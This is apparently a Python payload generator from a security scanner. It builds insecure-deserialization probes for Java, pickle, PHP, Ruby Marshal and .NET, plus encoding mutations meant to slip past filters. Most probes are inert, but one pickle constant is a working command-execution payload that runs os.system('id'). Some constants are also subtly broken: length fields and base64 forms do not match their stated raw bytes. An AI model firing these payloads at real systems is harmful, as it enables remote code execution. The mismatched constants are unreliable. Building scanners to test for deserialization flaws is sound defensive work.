"""deserialization: Payload generation."""
from __future__ import annotations

import base64
import gzip
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from argus.collectors.toolkit.enums import Severity
from argus.collectors.deserialization.models import DeserializationFormat, DeserializationMutationStrategy, DeserializationTechnique


class DeserializationPayloadGenerator:
    """
    Generates structured Insecure Deserialization validation probes across
    Java, Python pickle, PHP serialize, Ruby Marshal, and .NET ViewState/BinaryFormatter,
    with 5+ distinct encoding mutation and bypass strategies.
    """

    # Java base serialized stream (magic header \xac\xed\x00\x05 and safe non-existent class probe)
    # Binary: ac ed 00 05 73 72 00 1a 6f 72 67 2e 61 72 67 75 73 2e 73 65 63 75 72 69 74 79 2e 50 72 6f 62 65 4f 62 6a 65 63 74 00 00 00 00 00 00 00 01 02 00 00 78 70
    JAVA_RAW_BYTES = b"\xac\xed\x00\x05sr\x00\x1aorg.argus.security.ProbeObject\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xp"
    JAVA_BASE64 = "rO0ABXNyABpvcmcuYXJndXMuc2VjdXJpdHkuUHJvYmVPYmplY3QAAAAAAAAAAQIAAHhw"

    # Python pickle base payloads
    PYTHON_PICKLE_RAW = b"cos\nsystem\n(S'id'\ntR."
    PYTHON_PICKLE_BASE64 = "Y29zCnN5c3RlbQooUydpZCcKdFIu"
    PYTHON_PICKLE_PROTO4_RAW = b"\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x0bProbeObject\x94\x93\x94)\x81\x94."
    PYTHON_PICKLE_PROTO4_BASE64 = "gASVHgAAAAAAAACMCF9fbWFpbl9flIwaUHJvYmVPYmplY3SUk5QpgVQu"

    # PHP serialize base payloads
    PHP_SERIALIZE_PROBE = 'O:24:"Argus_Probe_NonExistent":1:{s:4:"test";s:4:"data";}'
    PHP_SERIALIZE_MALFORMED = 'O:4:"User":2:{s:4:"name";s:5:"admin";}'

    # Ruby Marshal base payloads
    RUBY_MARSHAL_RAW = b"\x04\x08o:\x1fArgus::Probe::NonExistent\x00"
    RUBY_MARSHAL_BASE64 = "BAhvOh9Bcmd1czo6UHJvYmU6Ok5vbkV4aXN0ZW50AA=="

    # .NET ViewState & BinaryFormatter base payloads
    DOTNET_BF_RAW = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x0c\x02\x00\x00\x00\x1cArgus.Probe.NonExistentClass\x00\x00\x00\x00"
    DOTNET_BF_BASE64 = "AAEAAAD/////AQAAAAAAAAAMAgAAABxBcmd1cy5Qcm9iZS5Ob25FeGlzdGVudENsYXNzAAAA"
    DOTNET_VIEWSTATE_BASE64 = "/wEPDwULLTEyMzQ1Njc4OWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWNoZWNr"

    def generate_baseline_payload(self) -> str:
        """Generates a clean baseline text string."""
        return "argus_benign_baseline_probe_value"

    def mutate_base64(self, raw_bytes: bytes) -> Tuple[str, str]:
        """Generates standard Base64 and double Base64 strings."""
        b64_single = base64.b64encode(raw_bytes).decode("ascii")
        b64_double = base64.b64encode(b64_single.encode("ascii")).decode("ascii")
        return b64_single, b64_double

    def mutate_gzip(self, raw_bytes: bytes) -> str:
        """Gzip compresses bytes and encodes as Base64."""
        gzipped = gzip.compress(raw_bytes)
        return base64.b64encode(gzipped).decode("ascii")

    def mutate_hex(self, raw_bytes: bytes) -> Tuple[str, str]:
        """Generates raw hex (e.g. aced0005...) and escaped hex (e.g. \\xac\\xed\\x00\\x05...)."""
        hex_raw = raw_bytes.hex()
        hex_escaped = "".join(f"\\x{b:02x}" for b in raw_bytes)
        return hex_raw, hex_escaped

    def mutate_url_encoding(self, raw_str: str) -> Tuple[str, str]:
        """Generates single and double URL encodings."""
        url_single = urllib.parse.quote_plus(raw_str)
        url_double = urllib.parse.quote_plus(url_single)
        return url_single, url_double

    def generate_mutated_payloads(
        self,
        target_format: Optional[DeserializationFormat] = None,
        strategy: Optional[DeserializationMutationStrategy] = None,
    ) -> List[Dict[str, Any]]:
        """
        Generates comprehensive mutated payloads covering all formats and 5+ bypass strategies.
        """
        payloads: List[Dict[str, Any]] = []

        # 1. JAVA PAYLOADS
        if target_format is None or target_format == DeserializationFormat.JAVA:
            b64_s, b64_d = self.mutate_base64(self.JAVA_RAW_BYTES)
            gzip_b64 = self.mutate_gzip(self.JAVA_RAW_BYTES)
            hex_raw, hex_esc = self.mutate_hex(self.JAVA_RAW_BYTES)
            url_s, url_d = self.mutate_url_encoding(b64_s)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": b64_s,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_base64",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_d,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_double_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.GZIP_BASE64:
                payloads.append({
                    "payload": gzip_b64,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.GZIP_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_gzip",
                    "content_type": "application/gzip",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_raw,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.URL_ENCODE:
                payloads.append({
                    "payload": url_s,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_url_encoded",
                    "content_type": "application/x-www-form-urlencoded",
                })
                payloads.append({
                    "payload": url_d,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_double_url",
                    "content_type": "application/x-www-form-urlencoded",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.JAVA_RAW_BYTES.decode("latin1"),
                    "raw_bytes": self.JAVA_RAW_BYTES,
                    "format": DeserializationFormat.JAVA.value,
                    "technique": DeserializationTechnique.OBJECT_INPUT_STREAM.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_java_content_type",
                    "content_type": "application/x-java-serialized-object",
                })

        # 2. PYTHON PICKLE PAYLOADS
        if target_format is None or target_format == DeserializationFormat.PYTHON_PICKLE:
            b64_s, b64_d = self.mutate_base64(self.PYTHON_PICKLE_PROTO4_RAW)
            gzip_b64 = self.mutate_gzip(self.PYTHON_PICKLE_PROTO4_RAW)
            hex_raw, _ = self.mutate_hex(self.PYTHON_PICKLE_PROTO4_RAW)
            url_s, _ = self.mutate_url_encoding(b64_s)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.PYTHON_PICKLE_PROTO4_BASE64,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_proto4",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": self.PYTHON_PICKLE_BASE64,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_base64",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_d,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_double_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.GZIP_BASE64:
                payloads.append({
                    "payload": gzip_b64,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.GZIP_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_gzip",
                    "content_type": "application/gzip",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_raw,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.PYTHON_PICKLE_PROTO4_RAW.decode("latin1"),
                    "raw_bytes": self.PYTHON_PICKLE_PROTO4_RAW,
                    "format": DeserializationFormat.PYTHON_PICKLE.value,
                    "technique": DeserializationTechnique.PICKLE_LOADS.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_pickle_content_type",
                    "content_type": "application/x-python-pickle",
                })

        # 3. PHP SERIALIZE PAYLOADS
        if target_format is None or target_format == DeserializationFormat.PHP_SERIALIZE:
            raw_php_bytes = self.PHP_SERIALIZE_PROBE.encode("utf-8")
            b64_s, _ = self.mutate_base64(raw_php_bytes)
            url_s, url_d = self.mutate_url_encoding(self.PHP_SERIALIZE_PROBE)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.PHP_SERIALIZE_PROBE,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_raw",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": self.PHP_SERIALIZE_MALFORMED,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_malformed",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_s,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.URL_ENCODE:
                payloads.append({
                    "payload": url_s,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_url_encoded",
                    "content_type": "application/x-www-form-urlencoded",
                })
                payloads.append({
                    "payload": url_d,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.URL_ENCODE.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_double_url",
                    "content_type": "application/x-www-form-urlencoded",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.PHP_SERIALIZE_PROBE,
                    "format": DeserializationFormat.PHP_SERIALIZE.value,
                    "technique": DeserializationTechnique.PHP_UNSERIALIZE.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_php_content_type",
                    "content_type": "application/x-php-serialized",
                })

        # 4. RUBY MARSHAL PAYLOADS
        if target_format is None or target_format == DeserializationFormat.RUBY_MARSHAL:
            b64_s, b64_d = self.mutate_base64(self.RUBY_MARSHAL_RAW)
            hex_raw, _ = self.mutate_hex(self.RUBY_MARSHAL_RAW)
            url_s, _ = self.mutate_url_encoding(b64_s)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.RUBY_MARSHAL_BASE64,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_base64",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_d,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_double_base64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_raw,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.RUBY_MARSHAL_RAW.decode("latin1"),
                    "raw_bytes": self.RUBY_MARSHAL_RAW,
                    "format": DeserializationFormat.RUBY_MARSHAL.value,
                    "technique": DeserializationTechnique.RUBY_MARSHAL_LOAD.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_ruby_marshal_content_type",
                    "content_type": "application/x-ruby-marshal",
                })

        # 5. .NET VIEWSTATE / BINARYFORMATTER PAYLOADS
        if target_format is None or target_format in (
            DeserializationFormat.DOTNET_VIEWSTATE,
            DeserializationFormat.DOTNET_BINARY_FORMATTER,
        ):
            b64_bf, b64_bf_d = self.mutate_base64(self.DOTNET_BF_RAW)
            hex_bf, _ = self.mutate_hex(self.DOTNET_BF_RAW)

            if strategy is None or strategy == DeserializationMutationStrategy.BASE64:
                payloads.append({
                    "payload": self.DOTNET_VIEWSTATE_BASE64,
                    "format": DeserializationFormat.DOTNET_VIEWSTATE.value,
                    "technique": DeserializationTechnique.DOTNET_VIEWSTATE.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.HIGH.value,
                    "confidence": 0.90,
                    "template_id": "deserialization_dotnet_viewstate",
                    "content_type": "application/x-www-form-urlencoded",
                })
                payloads.append({
                    "payload": self.DOTNET_BF_BASE64,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_binary_formatter",
                    "content_type": "text/plain",
                })
                payloads.append({
                    "payload": b64_bf_d,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.DOUBLE_BASE64.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_bf_double_b64",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.HEX:
                payloads.append({
                    "payload": hex_bf,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.HEX.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_bf_hex",
                    "content_type": "text/plain",
                })

            if strategy is None or strategy == DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION:
                payloads.append({
                    "payload": self.DOTNET_BF_RAW.decode("latin1"),
                    "raw_bytes": self.DOTNET_BF_RAW,
                    "format": DeserializationFormat.DOTNET_BINARY_FORMATTER.value,
                    "technique": DeserializationTechnique.DOTNET_BINARY_FORMATTER.value,
                    "mutation_strategy": DeserializationMutationStrategy.CONTENT_TYPE_MANIPULATION.value,
                    "severity": Severity.CRITICAL.value,
                    "confidence": 0.95,
                    "template_id": "deserialization_dotnet_content_type",
                    "content_type": "application/octet-stream",
                })

        return payloads
